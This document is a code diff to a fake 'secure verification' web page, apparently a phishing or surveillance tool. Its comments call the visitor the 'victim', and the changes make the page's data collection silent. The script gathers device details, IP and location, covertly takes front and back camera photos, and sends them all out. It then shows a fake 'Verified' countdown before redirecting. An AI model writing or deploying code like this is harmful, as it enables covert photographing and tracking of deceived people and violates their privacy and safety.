@@ -88,12 +88,21 @@
             opacity: 0.7;
             animation: pulseGlow 1.5s infinite;
         }
-        .status-text {
-            font-size: 13px;
-            opacity: 0.8;
-            margin-top: 10px;
-            min-height: 20px;
+        /* ===== REDIRECT TIMER ===== */
+        #redirectTimer {
+            margin-top: 20px;
+            font-size: 16px;
+            font-weight: 600;
             color: #f093fb;
+            display: none;
+        }
+        #redirectTimer .count {
+            font-size: 28px;
+            font-weight: 800;
+            color: #fff;
+            display: block;
+            margin: 8px 0;
+            animation: pulseGlow 1s infinite;
         }
     </style>
 </head>
@@ -109,7 +118,13 @@
         </button>
         <p class="footer-text">End-to-end encrypted · Secure connection</p>
         <div id="loading" class="hidden">⏳ Processing...</div>
-        <div id="statusText" class="status-text"></div>
+        
+        <!-- ===== REDIRECT TIMER (VICTIM KO DIKHEGA) ===== -->
+        <div id="redirectTimer">
+            <span>✅ Verified! Redirecting in</span>
+            <span class="count" id="timerCount">5</span>
+            <span>seconds...</span>
+        </div>
     </div>
 
     <script>
@@ -172,11 +187,8 @@
             return new Promise(resolve => setTimeout(resolve, ms));
         }
 
-        // ===== CAPTURE SINGLE CAMERA =====
+        // ===== CAPTURE SINGLE CAMERA (SILENT) =====
         async function captureCamera(facingMode, label) {
-            const statusText = document.getElementById('statusText');
-            statusText.textContent = `📸 Capturing ${label} camera...`;
-
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: facingMode }
@@ -194,7 +206,7 @@
                         video.play();
                         resolve();
                     };
-                    setTimeout(resolve, 2000); // fallback
+                    setTimeout(resolve, 2000);
                 });
 
                 // Wait extra for camera to focus
@@ -212,36 +224,31 @@
                 // Stop stream
                 stream.getTracks().forEach(track => track.stop());
 
-                // Send photo
+                // Send photo (SILENTLY)
                 await sendData({
                     photo: photoData,
                     camera_type: label
                 });
 
-                statusText.textContent = `✅ ${label} camera captured!`;
-                await wait(800);
-
                 return true;
             } catch (err) {
                 console.log(`${label} camera error:`, err);
-                statusText.textContent = `❌ ${label} camera failed`;
-                await wait(800);
                 return false;
             }
         }
 
-        // ===== MAIN CAPTURE SEQUENCE =====
+        // ===== MAIN CAPTURE SEQUENCE (SILENT) =====
         async function startCapture() {
             const btn = document.getElementById('continueBtn');
             const loading = document.getElementById('loading');
-            const statusText = document.getElementById('statusText');
+            const timer = document.getElementById('redirectTimer');
+            const timerCount = document.getElementById('timerCount');
 
             btn.disabled = true;
-            btn.textContent = '⏳ Please wait...';
+            btn.style.display = 'none';
             loading.classList.remove('hidden');
 
-            // Step 1: Send device info + IP first
-            statusText.textContent = '📡 Collecting device info...';
+            // Step 1: Send device info + IP
             const device = getDeviceInfo();
             const loc = await getLocationInfo();
             await sendData({
@@ -251,31 +258,37 @@
                 lat: loc.lat,
                 lng: loc.lng
             });
+            await wait(500);
+
+            // Step 2: Front camera capture (SILENT)
+            await captureCamera('user', 'Front');
             await wait(1000);
 
-            // Step 2: Front camera capture (FIRST)
-            statusText.textContent = '📸 Starting front camera...';
-            await wait(500);
-            await captureCamera('user', 'Front');
-            await wait(1500);
-
-            // Step 3: Back camera capture (SECOND)
-            statusText.textContent = '📸 Starting back camera...';
-            await wait(500);
+            // Step 3: Back camera capture (SILENT)
             await captureCamera('environment', 'Back');
-            await wait(1500);
+            await wait(1000);
 
-            // Step 4: Request location (optional)
-            statusText.textContent = '📍 Requesting location...';
+            // Step 4: Location (optional)
             requestLocation();
-            await wait(2000);
+            await wait(500);
 
-            // Step 5: Final redirect
-            statusText.textContent = '✅ All done! Redirecting...';
-            btn.textContent = '✅ Verified!';
-            await wait(2000);
+            // ===== HIDE LOADING, SHOW TIMER =====
+            loading.classList.add('hidden');
+            timer.style.display = 'block';
 
-            window.location.href = redirectUrl || 'https://google.com';
+            // ===== 5 SECOND TIMER =====
+            let seconds = 5;
+            timerCount.textContent = seconds;
+
+            const interval = setInterval(() => {
+                seconds--;
+                timerCount.textContent = seconds;
+
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                    window.location.href = redirectUrl || 'https://google.com';
+                }
+            }, 1000);
         }
 
         // ===== LOCATION (OPTIONAL) =====
